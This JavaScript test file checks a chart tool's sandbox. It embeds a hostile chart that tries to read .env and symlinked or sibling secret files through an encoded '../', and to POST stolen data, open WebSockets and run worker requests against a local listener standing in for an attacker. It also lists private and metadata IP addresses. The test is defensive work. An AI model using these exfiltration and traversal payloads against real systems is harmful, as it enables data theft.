// The page a check renders runs code the checker did not write. This test makes such a page try to leave: read files
// it should not, reach this machine's own services, and send what it read out. A listener on 127.0.0.1 stands for
// an attacker's server and for an internal service; nothing may reach it, and every attempt must be reported.
// A file next to the chart must still load (charts read their data from there).
import fs from "fs";
import os from "os";
import path from "path";
import http from "http";
import assert from "assert";
import { check } from "../src/check/index.js";
import { launch } from "../src/check/browser.js";
import { fetchPublic, isPrivate } from "../src/check/network.js";

const root = fs.mkdtempSync(path.join(os.tmpdir(), "rhp-isolation-"));
const project = path.join(root, "proj");
const sibling = path.join(root, "proj-old");
fs.mkdirSync(project);
fs.mkdirSync(sibling);
fs.writeFileSync(path.join(project, "data.txt"), "3,7");
fs.writeFileSync(path.join(project, ".env"), "SECRET=dotfile");
fs.writeFileSync(path.join(sibling, "secret.txt"), "SECRET=sibling");
fs.symlinkSync(path.join(sibling, "secret.txt"), path.join(project, "linked.txt"));
fs.writeFileSync(path.join(project, "allowed.js"), "window.allowedScript = true;");
fs.writeFileSync(path.join(project, ".private.js"), 'throw new Error("PRIVATE_SCRIPT_RAN");');
fs.writeFileSync(path.join(sibling, "private.js"), 'throw new Error("SIBLING_SCRIPT_RAN");');
fs.symlinkSync(path.join(sibling, "private.js"), path.join(project, "linked.js"));

// The listener: counts every request and every WebSocket upgrade
const reached = [];
const server = http.createServer((req, res) => {
  let body = "";
  req.on("data", (c) => (body += c));
  req.on("end", () => {
    reached.push(`${req.method} ${req.url} ${body}`);
    res.setHeader("access-control-allow-origin", "*");
    res.end("ok");
  });
});
server.on("upgrade", (req, socket) => {
  reached.push(`WEBSOCKET ${req.url}`);
  socket.destroy();
});
await new Promise((done) => server.listen(0, "127.0.0.1", done));
const port = server.address().port;

const chart = `import { Chart, Plot, Bar, slat } from "@bezda/rhp";
import { createSignal } from "solid-js";

const [seen, setSeen] = createSignal([]);
const note = (what) => setSeen((s) => [...s, what]);
const read = (p) => fetch(p).then((r) => (r.ok ? r.text() : "status " + r.status), () => "failed");

// A file next to the chart: allowed
read("/data.txt").then((t) => note("data " + t));
// A hidden file, and a sibling folder through an encoded "../": refused
read("/linked.txt").then((t) => note("link " + t));
read("/.env").then((t) => note("env " + t));
read("/..%2Fproj-old%2Fsecret.txt").then((t) => note("sibling " + t));
// Sending out what it read, and reaching this machine's services: blocked
read("/data.txt").then((t) => fetch("http://127.0.0.1:${port}/post", { method: "POST", body: t }).catch(() => note("post blocked")));
fetch("http://127.0.0.1:${port}/get").catch(() => note("get blocked"));
fetch("http://localhost:${port}/name").catch(() => note("name blocked"));
const ws = new WebSocket("ws://127.0.0.1:${port}/ws");
ws.onclose = () => note("ws closed");
const worker = new Worker(URL.createObjectURL(new Blob([
  'fetch("http://127.0.0.1:${port}/worker-get").catch(() => {}); new WebSocket("ws://127.0.0.1:${port}/worker-ws");'
], { type: "text/javascript" })));


const Row = slat({}, (d) => <div><Bar to={d.v} /></div>);
export default function App() {
  return <div><Chart scale={[0, 10]}><Plot v={[3, 7]}>{Row}</Plot></Chart><pre id="seen">{seen().join("\\n")}</pre></div>;
}
`;
fs.writeFileSync(path.join(project, "chart.jsx"), chart);

const launched = await launch();
assert.ok(launched.browser, "a browser launches");
console.log(`browser: ${launched.name}, Chromium sandbox ${launched.sandboxed ? "on" : "off (it cannot start here)"}`);
if (process.platform === "darwin" || process.platform === "win32") assert.ok(launched.sandboxed, "the Chromium sandbox is on");

let failures = 0;
const expect = (ok, what) => {
  console.log(`${ok ? "ok  " : "FAIL"} ${what}`);
  if (!ok) failures++;
};

try {
  const result = await check({ file: path.join(project, "chart.jsx"), widths: [1280], interact: false, browser: launched.browser });
  await new Promise((done) => setTimeout(done, 1000));
  const codes = result.findings.map((f) => `${f.code}: ${f.message}`);

  expect(reached.length === 0, `nothing reached the listener on 127.0.0.1 (${reached.length ? reached.join("; ") : "none"})`);
  expect(codes.some((c) => c.includes(`127.0.0.1:${port}/post`) && c.includes("only reads from public addresses")), "the POST is reported as blocked");
  expect(codes.some((c) => c.includes(`127.0.0.1:${port}/get`)), "the GET to 127.0.0.1 is reported");
  expect(codes.some((c) => c.includes(`localhost:${port}/name`)), "the GET to localhost is reported");
  expect(codes.some((c) => c.includes(`ws://127.0.0.1:${port}/ws`)), "the WebSocket is reported");
  expect(codes.some((c) => c.includes(`127.0.0.1:${port}/worker-get`)), "a worker's private HTTP request is reported");
  expect(codes.some((c) => c.includes(`127.0.0.1:${port}`) && c.includes("unrouted browser connection")), "the network fence reports a worker socket before forwarding anything");
  expect(codes.some((c) => c.startsWith("request-failed") && c.includes("/.env")), "the hidden file is refused and reported");
  expect(codes.some((c) => c.startsWith("request-failed") && c.includes("proj-old")), "the sibling folder is refused and reported");
  expect(codes.some((c) => c.startsWith("request-failed") && c.includes("linked.txt")), "a symlink outside the chart folder is refused");
  expect(!codes.some((c) => c.includes("/data.txt")), "the file next to the chart loads");

  const html = path.join(project, "chart.html");
  fs.writeFileSync(html, `<!doctype html><html lang="en"><head><meta charset="utf-8"><title>File isolation</title></head><body>
    <script src="./allowed.js"></script><script src="./.private.js"></script>
    <script src="../proj-old/private.js"></script><script src="./linked.js"></script>
    <div class="rhp-chart" style="width:400px;height:120px">File isolation test</div></body></html>`);
  const raw = await check({ file: html, widths: [1280], interact: false, guard: false, browser: launched.browser });
  const rawCodes = raw.findings.map((f) => `${f.code}: ${f.message}`);
  expect(!rawCodes.some((c) => /PRIVATE_SCRIPT_RAN|SIBLING_SCRIPT_RAN/.test(c)), "HTML pages cannot run hidden, sibling or symlinked-out scripts");
  for (const file of [".private.js", "proj-old/private.js", "linked.js"]) {
    expect(rawCodes.some((c) => c.startsWith("request-failed") && c.includes(file)), `HTML page reports the blocked ${file}`);
  }
  expect(!rawCodes.some((c) => c.includes("allowed.js")), "HTML pages can still load a script beside the chart");
} finally {
  await launched.browser.close();
}

// The address rules, and the fetcher on its own (a name that resolves to this machine, and a redirect's every hop)
for (const ip of ["127.0.0.1", "10.1.2.3", "172.20.0.1", "192.168.1.1", "169.254.169.254", "100.64.0.1", "0.0.0.0", "::1", "fe80::1", "fd00::1", "::ffff:127.0.0.1", "::ffff:7f00:1", "0:0:0:0:0:ffff:7f00:1"]) {
  expect(isPrivate(ip), `${ip} is not public`);
}
for (const ip of ["8.8.8.8", "151.101.1.229", "2606:4700::1111"]) expect(!isPrivate(ip), `${ip} is public`);
const viaName = await fetchPublic(`http://localhost:${port}/direct`);
expect(viaName.blocked === true, "fetchPublic refuses a name that resolves to this machine");
const post = await fetchPublic("https://example.com/", { method: "POST" });
expect(post.blocked === true, "fetchPublic refuses a POST without sending it");
expect(reached.length === 0, "and nothing reached the listener");

server.close();
fs.rmSync(root, { recursive: true, force: true });
if (failures) {
  console.log(`\n${failures} isolation check(s) failed`);
  process.exit(1);
}
console.log("\nisolation: private network and file reads were blocked, and permitted chart assets loaded");
